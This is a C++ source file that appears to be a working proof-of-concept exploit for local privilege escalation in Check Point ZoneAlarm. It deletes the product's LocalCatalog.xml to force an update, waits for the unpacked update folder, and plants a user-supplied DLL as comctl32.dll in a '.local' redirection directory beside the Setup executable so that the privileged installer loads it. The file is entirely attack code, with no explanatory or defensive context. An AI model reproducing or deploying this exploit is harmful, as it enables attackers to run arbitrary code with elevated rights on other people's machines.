#include <Windows.h>
#include <iostream>
#include <shlwapi.h>
#include <strsafe.h>
#include <winnt.h>
#pragma comment(lib,"shlwapi.lib")
#define chonst const

VOID Pwn(wchar_t* dll) {
	BOOL direxist = FALSE;
	HANDLE hFile;
	WIN32_FIND_DATA ffd;
	wchar_t newdir[MAX_PATH];

	wchar_t targetdir[] = L"\\\\?\\UNC\\localhost\\c$\\ProgramData\\CheckPoint\\ZoneAlarm\\Data\\Updates\\unpacked==ICM=update_ICM.zip\\";
	wchar_t listdir[MAX_PATH];
	wprintf(L"Waiting directory to be created!\n");
	while (!direxist) {
		direxist = PathFileExists(targetdir);
		if (direxist) {
			wprintf(L"Directory created!\n");
			StringCchCopy(listdir, MAX_PATH, targetdir);
			StringCchCat(listdir, MAX_PATH, L"\\*");
			hFile = FindFirstFile(listdir, &ffd);
			if (hFile != INVALID_HANDLE_VALUE) {
				do
				{
					if (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
					{
					}
					else
					{
						wchar_t* fileex = wcsstr(ffd.cFileName, L"Setup");
						if (fileex != NULL) {
							StringCchCopy(newdir, MAX_PATH, targetdir);
							StringCchCat(newdir, MAX_PATH, ffd.cFileName);
							StringCchCat(newdir, MAX_PATH, L".local");
							if (CreateDirectory(newdir, NULL)) {

								StringCchCat(newdir, MAX_PATH, L"\\x86_microsoft.windows.common-controls_6595b64144ccf1df_5.82.19041.1110_none_c0da534e38c01f4d");
								if (CreateDirectory(newdir, NULL)) {
									StringCchCat(newdir, MAX_PATH, L"\\comctl32.dll");
									if (CopyFile(dll, newdir, TRUE)) {
										wprintf(L"Copying %ws to %ws \n", dll, newdir);
										break;
									}
								}

							}
						}
					}
				} while (FindNextFile(hFile, &ffd) != 0);
			}

		}
	}

}
BOOL Delete() {
	wchar_t updatedir[MAX_PATH] = L"\\\\?\\UNC\\localhost\\c$\\ProgramData\\CheckPoint\\ZoneAlarm\\Data\\Updates\\";

	if (PathFileExists(updatedir)) {
		StringCchCat(updatedir, MAX_PATH, L"LocalCatalog.xml");
		if (PathFileExists(updatedir)) {
			wprintf(L"File LocalCatalog.xml found! Trying to delete it!\n");
			if (DeleteFile(updatedir)) {
				wprintf(L"File Deleted!\n");
				return TRUE;
			}
			else
			{
				wprintf(L"Error[DeleteFile]: %d\n", GetLastError());
				return FALSE;
			}
		}
		else
		{
			wprintf(L"LocalCatalog.xml not found! Continuing ...\n");
			return TRUE;
		}
	}
	else
	{
		wprintf(L"Updates directory not found! Continuing ...\n");
		return TRUE;
	}



}
int wmain(int argc, wchar_t* argv[])
{
	if (Delete()) {
		Pwn(argv[1]);
	}
}

